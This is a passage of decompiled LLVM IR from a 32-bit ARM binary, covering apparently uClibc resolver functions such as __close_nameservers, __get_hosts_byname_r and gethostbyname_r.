dec_label_pc_19658:                               ; preds = %dec_label_pc_195d8, %dec_label_pc_195c8, %dec_label_pc_192b4, %dec_label_pc_19618, %dec_label_pc_19608, %dec_label_pc_195f4, %dec_label_pc_1963c, %dec_label_pc_19648
  store i32 30352, i32* %r3.global-to-local, align 4
  %v0_1965c = load i32, i32* @r5, align 4
  %v2_1965c = add i32 %v0_1965c, 30352
  %v3_1965c = inttoptr i32 %v2_1965c to i32*
  %v4_1965c = load i32, i32* %v3_1965c, align 4
  store i32 %v4_1965c, i32* %r0.global-to-local, align 4
  %v2_19660 = icmp eq i32 %v4_1965c, 0
  br i1 %v2_19660, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_19658
  store i32 104044, i32* %lr.global-to-local, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_19658, %bb64
  %v2_19668 = xor i1 %v2_19660, true
  call void @__pseudo_cond_branch(i1 %v2_19668, i32 %v4_1965c)
  %v2_19670 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_19670, i32* %r4.global-to-local, align 4
  store i32 %v15_19264, i32* @r8, align 4
  store i32 %v18_19264, i32* @sb, align 4
  store i32 %v21_19264, i32* @sl, align 4
  store i32 %v24_19264, i32* @fp, align 4
  store i32 %v27_19264, i32* %lr.global-to-local, align 4
  ret i32 %v4_1965c

; uselistorder directives
  uselistorder i32 %v1_19628, { 1, 0, 2, 3 }
  uselistorder i32 %v2_195d8, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_19368, { 1, 0 }
  uselistorder i32 %v2_19350, { 1, 0 }
  uselistorder i32 %v2_19330, { 1, 0 }
  uselistorder i32 %v2_19558, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 %v0_19528, { 1, 0, 2, 3 }
  uselistorder i32 %v1_19518, { 1, 0 }
  uselistorder i32 %v0_194b8, { 1, 0, 2 }
  uselistorder i32 %v1_1943017, { 1, 0 }
  uselistorder i32 %v1_1942810, { 1, 0 }
  uselistorder i32 %v0_194289, { 1, 0 }
  uselistorder i32 %v1_19430, { 1, 0 }
  uselistorder i32 %v3_193ac, { 1, 0, 2, 3, 4 }
  uselistorder i16* %stack_var_-68, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 10, 8, 9, 11, 12, 13, 23, 0, 14, 15, 16, 1, 19, 17, 18, 20, 21, 22, 24, 25, 26, 27, 28 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 17, 5, 0, 7, 6, 14, 8, 9, 10, 11, 12, 13, 15, 16 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 21, 3, 4, 5, 6, 7, 8, 16, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 2, 5, 4, 6, 8, 7, 10, 9, 12, 11, 56, 55, 13, 15, 14, 17, 16, 18, 20, 19, 22, 21, 23, 24, 26, 25, 27, 29, 28, 34, 33, 49, 48, 30, 31, 32, 36, 35, 38, 37, 39, 41, 40, 42, 44, 43, 45, 47, 46, 52, 50, 51, 54, 53 }
  uselistorder i32 (i16*)* @__GI_fclose, { 4, 3, 0, 1, 2 }
  uselistorder i32 (i32)* @atol, { 0, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 58, { 0, 5, 4, 6, 1, 2, 3 }
  uselistorder i32 (i32*, i32)* @realloc, { 2, 3, 1, 0 }
  uselistorder i16 2, { 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_memset, { 24, 35, 36, 2, 32, 23, 3, 4, 22, 27, 14, 20, 21, 38, 37, 25, 0, 15, 5, 6, 7, 8, 9, 10, 11, 12, 13, 26, 1, 16, 17, 18, 19, 28, 29, 30, 31, 33, 34 }
  uselistorder i32 ()* @skip_nospace, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_fopen, { 0, 1, 4, 3, 2 }
  uselistorder i32 -33888, { 1, 0 }
  uselistorder i32 4127, { 0, 3, 4, 2, 1 }
  uselistorder i32 -32932, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -32932), { 1, 0 }
  uselistorder i32 30352, { 0, 2, 1, 3 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_19658, { 7, 6, 3, 4, 5, 0, 1, 2 }
  uselistorder label %dec_label_pc_195c8, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1957c, { 1, 0 }
  uselistorder label %dec_label_pc_19574, { 1, 0 }
  uselistorder label %dec_label_pc_19438, { 1, 0 }
  uselistorder label %dec_label_pc_19558.backedge, { 4, 10, 8, 7, 9, 0, 1, 2, 3, 6, 5 }
  uselistorder label %dec_label_pc_192b4, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
}

define i32 @__close_nameservers() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_196c0 = load i32, i32* @r4, align 4
  store i32 %v3_196c0, i32* %stack_var_-20, align 4
  store i32 30360, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r5, align 4
  store i32 -32856, i32* %r3.global-to-local, align 4
  %v4_196d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 30360) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -32856), i32* %r3.global-to-local, align 4
  store i32 104168, i32* @lr, align 4
  %v1_196e4 = icmp ne i32 %v4_196d4, add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -32856)
  call void @__pseudo_cond_branch(i1 %v1_196e4, i32 ptrtoint (i32* @global_var_136fc.598 to i32))
  store i32 30364, i32* %r3.global-to-local, align 4
  store i32 30368, i32* @r7, align 4
  store i32 30356, i32* @r6, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_196f8 = load i32, i32* @r5, align 4
  %v3_196f8 = add i32 %v1_196f8, 30364
  %v4_196f8 = inttoptr i32 %v3_196f8 to i32*
  store i32 0, i32* %v4_196f8, align 4
  %v0_196fc = load i32, i32* %r2.global-to-local, align 4
  %v1_196fc = load i32, i32* @r5, align 4
  %v2_196fc = load i32, i32* %r4.global-to-local, align 4
  %v3_196fc = add i32 %v2_196fc, %v1_196fc
  %v4_196fc = inttoptr i32 %v3_196fc to i32*
  store i32 %v0_196fc, i32* %v4_196fc, align 4
  br label %dec_label_pc_19714

dec_label_pc_19704:                               ; preds = %dec_label_pc_19714
  store i32 %v4_19728, i32* %r3.global-to-local, align 4
  store i32 %v1_1971c, i32* %v3_19714, align 4
  %v0_1970c = load i32, i32* %r3.global-to-local, align 4
  %v1_1970c = load i32, i32* %r2.global-to-local, align 4
  %v4_1970c = mul i32 %v1_1970c, 4
  %v5_1970c = add i32 %v4_1970c, %v0_1970c
  %v6_1970c = inttoptr i32 %v5_1970c to i32*
  %v7_1970c = load i32, i32* %v6_1970c, align 4
  store i32 %v7_1970c, i32* @r0, align 4
  %v0_19710 = call i32 @free()
  br label %dec_label_pc_19714

dec_label_pc_19714:                               ; preds = %entry, %dec_label_pc_19704
  %v0_19714 = load i32, i32* @r5, align 4
  %v1_19714 = load i32, i32* @r7, align 4
  %v2_19714 = add i32 %v1_19714, %v0_19714
  %v3_19714 = inttoptr i32 %v2_19714 to i32*
  %v4_19714 = load i32, i32* %v3_19714, align 4
  store i32 %v4_19714, i32* @r4, align 4
  %v2_19718 = icmp eq i32 %v4_19714, 0
  %v1_1971c = add i32 %v4_19714, -1
  store i32 %v1_1971c, i32* %r2.global-to-local, align 4
  %v0_19720 = load i32, i32* @r6, align 4
  store i32 %v0_19720, i32* %r3.global-to-local, align 4
  %v2_19728 = add i32 %v0_19720, %v0_19714
  %v3_19728 = inttoptr i32 %v2_19728 to i32*
  %v4_19728 = load i32, i32* %v3_19728, align 4
  br i1 %v2_19718, label %dec_label_pc_19728, label %dec_label_pc_19704

dec_label_pc_19728:                               ; preds = %dec_label_pc_19714
  store i32 %v4_19728, i32* @r0, align 4
  %v0_1972c = call i32 @free()
  %v0_19730 = load i32, i32* @r4, align 4
  %v1_19730 = load i32, i32* @r5, align 4
  %v2_19730 = load i32, i32* @r6, align 4
  %v3_19730 = add i32 %v2_19730, %v1_19730
  %v4_19730 = inttoptr i32 %v3_19730 to i32*
  store i32 %v0_19730, i32* %v4_19730, align 4
  %v2_19738 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_19738, i32* %r4.global-to-local, align 4
  ret i32 %v0_1972c

; uselistorder directives
  uselistorder i32 %v4_19728, { 1, 0 }
  uselistorder i32 %v1_1971c, { 1, 0 }
  uselistorder i32* %v3_19714, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 30356, { 4, 1, 7, 5, 6, 0, 3, 2, 8 }
  uselistorder i32 30368, { 1, 2, 4, 3, 0 }
  uselistorder i32 30364, { 0, 1, 3, 7, 4, 8, 2, 6, 5, 9, 10, 12, 11, 13 }
  uselistorder i32 -32856, { 1, 2, 0, 3 }
  uselistorder i32 30360, { 4, 5, 1, 0, 7, 2, 6, 3, 8 }
  uselistorder label %dec_label_pc_19714, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v0_19758 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_19794 = call i32 @__read_etc_hosts_r()
  store i32 %v0_19758, i32* @lr, align 4
  ret i32 %v0_19794
}

define i32 @gethostbyname_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp29, i32* %stack_var_0, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_197ac = load i32, i32* @r2, align 4
  store i32 %tmp29, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_197b8 = load i32, i32* @r0, align 4
  store i32 %v0_197b8, i32* @sl, align 4
  %v2_197b8 = icmp eq i32 %v0_197b8, 0
  %v2_197bc = inttoptr i32 %tmp29 to i32*
  store i32 0, i32* %v2_197bc, align 4
  %v0_197c0 = load i32, i32* @r1, align 4
  store i32 %v0_197c0, i32* @r7, align 4
  %v0_197c4 = load i32, i32* @r3, align 4
  store i32 %v0_197c4, i32* @r6, align 4
  br i1 %v2_197b8, label %bb, label %dec_label_pc_197d0

bb:                                               ; preds = %entry
  %v1_197c8 = load i32, i32* @r5, align 4
  %v2_197c8 = add i32 %v1_197c8, 22
  store i32 %v2_197c8, i32* @r5, align 4
  br label %dec_label_pc_19a8c

dec_label_pc_197d0:                               ; preds = %entry
  %v0_197d0 = call i32 @__GI___errno_location()
  store i32 %v0_197d0, i32* %r0.global-to-local, align 4
  %v3_197d4 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_197d4, i32* %ip.global-to-local, align 4
  %v1_197d8 = inttoptr i32 %v0_197d0 to i32*
  %v2_197d8 = load i32, i32* %v1_197d8, align 4
  store i32 %v2_197d8, i32* @r8, align 4
  %v0_197dc = load i32, i32* @r5, align 4
  store i32 %v0_197dc, i32* %v1_197d8, align 4
  %v0_197e0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %tmp18, i32* %ip.global-to-local, align 4
  store i32 %v0_197d0, i32* @r4, align 4
  %v0_197f0 = load i32, i32* @sl, align 4
  store i32 %v0_197f0, i32* %r0.global-to-local, align 4
  %v0_197f4 = load i32, i32* @r7, align 4
  store i32 %v0_197f4, i32* %r2.global-to-local, align 4
  store i32 %v0_197ac, i32* %r3.global-to-local, align 4
  %v0_197fc = load i32, i32* @r6, align 4
  %v7_19804 = call i32 @__get_hosts_byname_r(i32 %v0_197f0, i32 2, i32 %v0_197f4, i32 %v0_197ac, i32 %v0_197fc, i32 %v0_197e0, i32 %tmp18)
  store i32 %v7_19804, i32* %r0.global-to-local, align 4
  store i32 %v7_19804, i32* @r5, align 4
  %v2_19808 = icmp eq i32 %v7_19804, 0
  br i1 %v2_19808, label %bb34, label %dec_label_pc_19814

bb34:                                             ; preds = %dec_label_pc_197d0
  %v1_1980c = load i32, i32* @r8, align 4
  %v2_1980c = load i32, i32* @r4, align 4
  %v3_1980c = inttoptr i32 %v2_1980c to i32*
  store i32 %v1_1980c, i32* %v3_1980c, align 4
  br label %dec_label_pc_19a8c

dec_label_pc_19814:                               ; preds = %dec_label_pc_197d0
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v1_19818 = inttoptr i32 %tmp18 to i32*
  %v2_19818 = load i32, i32* %v1_19818, align 4
  store i32 %v2_19818, i32* %r3.global-to-local, align 4
  %v7_1981c = icmp eq i32 %v2_19818, 1
  br i1 %v7_1981c, label %dec_label_pc_19838, label %dec_label_pc_19824

dec_label_pc_19824:                               ; preds = %dec_label_pc_19814
  %v7_19824 = icmp eq i32 %v2_19818, 4
  br i1 %v7_19824, label %dec_label_pc_19858, label %dec_label_pc_1982c

dec_label_pc_1982c:                               ; preds = %dec_label_pc_19824
  %v3_1982c = icmp eq i32 %v2_19818, -1
  br i1 %v3_1982c, label %dec_label_pc_1984c, label %dec_label_pc_19a8c

dec_label_pc_19838:                               ; preds = %dec_label_pc_19814
  %v7_19838 = icmp eq i32 %v7_19804, 2
  br i1 %v7_19838, label %.thread4, label %bb35

bb35:                                             ; preds = %dec_label_pc_19838
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_19860

.thread4:                                         ; preds = %dec_label_pc_19838
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_19860

dec_label_pc_1984c:                               ; preds = %dec_label_pc_1982c
  %v0_1984c = load i32, i32* @r4, align 4
  %v1_1984c = inttoptr i32 %v0_1984c to i32*
  %v2_1984c = load i32, i32* %v1_1984c, align 4
  store i32 %v2_1984c, i32* %r3.global-to-local, align 4
  %v7_19850 = icmp eq i32 %v2_1984c, 2
  br i1 %v7_19850, label %dec_label_pc_19858, label %dec_label_pc_19a8c

dec_label_pc_19858:                               ; preds = %dec_label_pc_1984c, %dec_label_pc_19824
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_19860

dec_label_pc_19860:                               ; preds = %.thread4, %bb35, %dec_label_pc_19858
  %storemerge2 = phi i32 [ 0, %dec_label_pc_19858 ], [ 0, %bb35 ], [ 1, %.thread4 ]
  store i32 %tmp18, i32* @ip, align 4
  store i32 -1, i32* @r3, align 4
  %v0_19868 = load i32, i32* @r8, align 4
  %v1_19868 = load i32, i32* @r4, align 4
  %v2_19868 = inttoptr i32 %v1_19868 to i32*
  store i32 %v0_19868, i32* %v2_19868, align 4
  %v0_1986c = load i32, i32* @sl, align 4
  %v1_1986c = inttoptr i32 %v0_1986c to i8*
  store i32 %v0_1986c, i32* %r0.global-to-local, align 4
  %v0_19870 = load i32, i32* @r3, align 4
  %v1_19870 = load i32, i32* @ip, align 4
  %v2_19870 = inttoptr i32 %v1_19870 to i32*
  store i32 %v0_19870, i32* %v2_19870, align 4
  %v3_19874 = call i32 @strlen(i8* %v1_1986c)
  store i32 %v3_19874, i32* %r0.global-to-local, align 4
  %v1_19878 = add i32 %v3_19874, 1
  store i32 %v1_19878, i32* @r4, align 4
  %v0_1987c = load i32, i32* @r6, align 4
  %v7_19880 = icmp sgt i32 %v0_1987c, %v1_19878
  br i1 %v7_19880, label %dec_label_pc_19884, label %dec_label_pc_19a88

dec_label_pc_19884:                               ; preds = %dec_label_pc_19860
  %v0_19884 = load i32, i32* @sl, align 4
  store i32 %v0_19884, i32* @r1, align 4
  store i32 %v1_19878, i32* @r2, align 4
  store i32 %v0_197ac, i32* @r0, align 4
  %v0_19890 = call i32 @memcpy()
  store i32 %v0_19890, i32* %r0.global-to-local, align 4
  %v1_19898 = load i32, i32* @r4, align 4
  %v2_19898 = add i32 %v1_19898, %v0_197ac
  %v1_1989c = sub i32 0, %v2_19898
  %v1_198a0 = load i32, i32* @r6, align 4
  %v2_198a0 = sub i32 %v1_198a0, %v1_19898
  store i32 %v2_198a0, i32* %r2.global-to-local, align 4
  %v1_198a4 = urem i32 %v1_1989c, 4
  store i32 %v1_198a4, i32* %r3.global-to-local, align 4
  %v2_198a8 = sub i32 %v2_198a0, %v1_198a4
  store i32 %v2_198a8, i32* @sb, align 4
  %v1_198ac = add i32 %v2_198a8, -8
  store i32 %v1_198ac, i32* @r5, align 4
  %v7_198b4 = icmp slt i32 %v1_198ac, 256
  br i1 %v7_198b4, label %dec_label_pc_19a88, label %dec_label_pc_198b8

dec_label_pc_198b8:                               ; preds = %dec_label_pc_19884
  %v2_198b8 = add i32 %v1_198a4, %v2_19898
  store i32 %v2_198b8, i32* @fp, align 4
  store i32 %v0_197ac, i32* %ip.global-to-local, align 4
  %v1_198c0 = add i32 %v2_198b8, 8
  store i32 %v1_198c0, i32* @r6, align 4
  store i32 0, i32* @r4, align 4
  %v1_198c8 = add i32 %v2_198b8, 16
  store i32 %v1_198c8, i32* @r8, align 4
  %v4_198cc = inttoptr i32 %v2_198b8 to i32*
  store i32 %v0_197ac, i32* %v4_198cc, align 4
  %v0_198d0 = load i32, i32* @sl, align 4
  store i32 %v0_198d0, i32* %r0.global-to-local, align 4
  %v0_198d4 = load i32, i32* @r4, align 4
  %v1_198d4 = load i32, i32* @fp, align 4
  %v2_198d4 = add i32 %v1_198d4, 4
  %v3_198d4 = inttoptr i32 %v2_198d4 to i32*
  store i32 %v0_198d4, i32* %v3_198d4, align 4
  %v0_198d8 = load i32, i32* @r8, align 4
  %v2_198dc = inttoptr i32 %v0_198d0 to i8*
  %v3_198dc = call i32 @inet_aton(i8* %v2_198dc, i32 %v0_198d8)
  store i32 %v3_198dc, i32* %r0.global-to-local, align 4
  %v1_198e0 = load i32, i32* @r4, align 4
  %v9_198e0 = icmp eq i32 %v3_198dc, %v1_198e0
  br i1 %v9_198e0, label %dec_label_pc_19924, label %dec_label_pc_198e8

dec_label_pc_198e8:                               ; preds = %dec_label_pc_198b8
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_198ec = load i32, i32* @r7, align 4
  %v2_198ec = add i32 %v1_198ec, 8
  %v3_198ec = inttoptr i32 %v2_198ec to i32*
  store i32 2, i32* %v3_198ec, align 4
  %v0_198f0 = load i32, i32* %r3.global-to-local, align 4
  %v2_198f0 = mul i32 %v0_198f0, 2
  %v1_198f4 = load i32, i32* @r7, align 4
  %v2_198f4 = add i32 %v1_198f4, 12
  %v3_198f4 = inttoptr i32 %v2_198f4 to i32*
  store i32 %v2_198f0, i32* %v3_198f4, align 4
  %v3_198f8 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_198f8, i32* %r2.global-to-local, align 4
  store i32 %v0_197ac, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* @ip, align 4
  %v0_19904 = load i32, i32* @r4, align 4
  store i32 %v0_19904, i32* @r5, align 4
  %v0_19908 = load i32, i32* @r8, align 4
  %v1_19908 = load i32, i32* @fp, align 4
  %v2_19908 = add i32 %v1_19908, 8
  %v3_19908 = inttoptr i32 %v2_19908 to i32*
  store i32 %v0_19908, i32* %v3_19908, align 4
  %v0_1990c = load i32, i32* @r7, align 4
  %v1_1990c = load i32, i32* %r2.global-to-local, align 4
  %v2_1990c = inttoptr i32 %v1_1990c to i32*
  store i32 %v0_1990c, i32* %v2_1990c, align 4
  %v0_19910 = load i32, i32* @r7, align 4
  %v1_19910 = inttoptr i32 %v0_19910 to i32*
  %v2_19910 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v2_19910, i32* %v1_19910, align 4
  %v3_19910 = add i32 %v0_19910, 4
  %v4_19910 = inttoptr i32 %v3_19910 to i32*
  %v5_19910 = load i32, i32* @fp, align 4
  store i32 %v5_19910, i32* %v4_19910, align 4
  %v0_19914 = load i32, i32* @r6, align 4
  %v1_19914 = load i32, i32* @r7, align 4
  %v2_19914 = add i32 %v1_19914, 16
  %v3_19914 = inttoptr i32 %v2_19914 to i32*
  store i32 %v0_19914, i32* %v3_19914, align 4
  %v0_19918 = load i32, i32* @r4, align 4
  %v1_19918 = load i32, i32* @ip, align 4
  %v2_19918 = inttoptr i32 %v1_19918 to i32*
  store i32 %v0_19918, i32* %v2_19918, align 4
  %v0_1991c = load i32, i32* @r4, align 4
  %v1_1991c = load i32, i32* @r6, align 4
  %v2_1991c = add i32 %v1_1991c, 4
  %v3_1991c = inttoptr i32 %v2_1991c to i32*
  store i32 %v0_1991c, i32* %v3_1991c, align 4
  br label %dec_label_pc_19a8c

dec_label_pc_19924:                               ; preds = %dec_label_pc_198b8
  store i32 %storemerge2, i32* %r2.global-to-local, align 4
  %v2_19928 = icmp eq i32 %storemerge2, 0
  br i1 %v2_19928, label %dec_label_pc_19940, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_19924
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_19818, align 4
  br label %dec_label_pc_19a8c

dec_label_pc_19940:                               ; preds = %dec_label_pc_19924
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_1994c = load i32, i32* @sl, align 4
  store i32 %v0_1994c, i32* %r0.global-to-local, align 4
  %v2_19954 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_19954, i32* %r2.global-to-local, align 4
  %v2_19958 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_19958, i32* %r3.global-to-local, align 4
  %v7_19964 = inttoptr i32 %v0_1994c to i8*
  %v8_19964 = call i32 @__dns_lookup(i8* %v7_19964, i32 1, i32 %v2_19954, i32 %v2_19958)
  store i32 %v8_19964, i32* %r0.global-to-local, align 4
  %v1_19968 = icmp slt i32 %v8_19964, 0
  br i1 %v1_19968, label %.thread, label %dec_label_pc_19980

.thread:                                          ; preds = %dec_label_pc_19940
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_19818, align 4
  br label %dec_label_pc_19a8c

dec_label_pc_19980:                               ; preds = %dec_label_pc_19940
  store i32 %tmp12, i32* %r3.global-to-local, align 4
  %v7_19984 = icmp eq i32 %tmp12, 1
  br i1 %v7_19984, label %dec_label_pc_1998c, label %dec_label_pc_19a64

dec_label_pc_1998c:                               ; preds = %dec_label_pc_19980
  store i32 0, i32* @r2, align 4
  store i32 12, i32* @r4, align 4
  store i32 12, i32* @r3, align 4
  %v0_199a4 = load i32, i32* @r5, align 4
  %v2_199a4 = add i32 %v0_199a4, -12
  store i32 %v2_199a4, i32* @r8, align 4
  %v8_199a4 = icmp slt i32 %v2_199a4, 0
  br i1 %v8_199a4, label %bb37, label %dec_label_pc_199b0

bb37:                                             ; preds = %dec_label_pc_1998c
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_19a74

dec_label_pc_199b0:                               ; preds = %dec_label_pc_1998c
  %v0_199b0 = load i32, i32* @r6, align 4
  store i32 %v0_199b0, i32* @r1, align 4
  %v2_199b4 = add i32 %v0_199b0, 12
  store i32 %v2_199b4, i32* @r0, align 4
  %v2_199b8 = call i32 @memmove(i32 %v2_199b4, i32 %v0_199b0)
  %v0_199bc = load i32, i32* @fp, align 4
  %v1_199bc = add i32 %v0_199bc, 4
  store i32 %v1_199bc, i32* @r3, align 4
  %v1_199c0 = load i32, i32* @r4, align 4
  %v2_199c0 = add i32 %v1_199c0, %v1_199bc
  store i32 %v2_199c0, i32* @r5, align 4
  store i32 %v2_199c0, i32* @r0, align 4
  store i32 4, i32* @r2, align 4
  %v0_199d0 = call i32 @memcpy()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_199dc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_199dc

dec_label_pc_199dc:                               ; preds = %dec_label_pc_199dc, %dec_label_pc_199b0
  %v0_199dc = phi i32 [ %v0_199dc.pre, %dec_label_pc_199b0 ], [ %v1_199e0, %dec_label_pc_199dc ]
  %v1_199dc = load i32, i32* @r6, align 4
  %v7_199dc = inttoptr i32 %v1_199dc to i32*
  store i32 %v0_199dc, i32* %v7_199dc, align 4
  %v0_199e0 = load i32, i32* @r5, align 4
  %v1_199e0 = add i32 %v0_199e0, 4
  store i32 %v1_199e0, i32* @r5, align 4
  %v0_199e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_199e4 = add i32 %v0_199e4, 1
  store i32 %v1_199e4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp38 = icmp eq i32 %v1_199e4, 0
  br i1 %tmp38, label %dec_label_pc_199dc, label %dec_label_pc_199f4

dec_label_pc_199f4:                               ; preds = %dec_label_pc_199dc
  %v3_199f4 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_199f4, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_199fc = icmp eq i32 %v3_199f4, 0
  %v1_19a00 = load i32, i32* @r6, align 4
  %v5_19a00 = mul i32 %v1_199e4, 4
  %v6_19a00 = add i32 %v1_19a00, %v5_19a00
  %v7_19a00 = inttoptr i32 %v6_19a00 to i32*
  store i32 0, i32* %v7_19a00, align 4
  br i1 %v2_199fc, label %dec_label_pc_19a30, label %dec_label_pc_19a08

dec_label_pc_19a08:                               ; preds = %dec_label_pc_199f4
  %v0_19a08 = load i32, i32* @r4, align 4
  %v1_19a08 = inttoptr i32 %v0_19a08 to i8*
  store i32 %v0_19a08, i32* %r0.global-to-local, align 4
  %v3_19a0c = call i32 @strlen(i8* %v1_19a08)
  store i32 %v3_19a0c, i32* %r0.global-to-local, align 4
  %v0_19a10 = load i32, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_19a10, %v3_19a0c
  br i1 %tmp, label %dec_label_pc_19a18, label %dec_label_pc_19a30

dec_label_pc_19a18:                               ; preds = %dec_label_pc_19a08
  %v0_19a18 = load i32, i32* @r4, align 4
  store i32 %v0_19a18, i32* @r1, align 4
  %v0_19a1c = load i32, i32* @r5, align 4
  store i32 %v0_19a1c, i32* %r0.global-to-local, align 4
  %v2_19a20 = inttoptr i32 %v0_19a1c to i8*
  %v3_19a20 = call i32 @strcpy(i8* %v2_19a20, i32 %v0_19a18)
  store i32 %v3_19a20, i32* %r0.global-to-local, align 4
  %v0_19a24 = load i32, i32* @r5, align 4
  br label %dec_label_pc_19a30

dec_label_pc_19a30:                               ; preds = %dec_label_pc_19a08, %dec_label_pc_199f4, %dec_label_pc_19a18
  %storemerge1 = phi i32 [ %v0_19a24, %dec_label_pc_19a18 ], [ %v0_197ac, %dec_label_pc_19a08 ], [ %v0_197ac, %dec_label_pc_199f4 ]
  store i32 %storemerge1, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_19a34 = load i32, i32* @r7, align 4
  %v2_19a34 = add i32 %v1_19a34, 8
  %v3_19a34 = inttoptr i32 %v2_19a34 to i32*
  store i32 2, i32* %v3_19a34, align 4
  %v0_19a38 = load i32, i32* %r2.global-to-local, align 4
  %v2_19a38 = mul i32 %v0_19a38, 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_19a40 = load i32, i32* @r7, align 4
  %v2_19a40 = add i32 %v1_19a40, 12
  %v3_19a40 = inttoptr i32 %v2_19a40 to i32*
  store i32 %v2_19a38, i32* %v3_19a40, align 4
  %v3_19a44 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_19a44, i32* @ip, align 4
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v0_19a4c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_19a4c, i32* @r5, align 4
  %v0_19a50 = load i32, i32* @r7, align 4
  %v2_19a50 = inttoptr i32 %v3_19a44 to i32*
  store i32 %v0_19a50, i32* %v2_19a50, align 4
  %v0_19a54 = load i32, i32* @r7, align 4
  %v1_19a54 = inttoptr i32 %v0_19a54 to i32*
  %v2_19a54 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_19a54, i32* %v1_19a54, align 4
  %v3_19a54 = add i32 %v0_19a54, 4
  %v4_19a54 = inttoptr i32 %v3_19a54 to i32*
  %v5_19a54 = load i32, i32* @fp, align 4
  store i32 %v5_19a54, i32* %v4_19a54, align 4
  %v0_19a58 = load i32, i32* @r6, align 4
  %v1_19a58 = load i32, i32* @r7, align 4
  %v2_19a58 = add i32 %v1_19a58, 16
  %v3_19a58 = inttoptr i32 %v2_19a58 to i32*
  store i32 %v0_19a58, i32* %v3_19a58, align 4
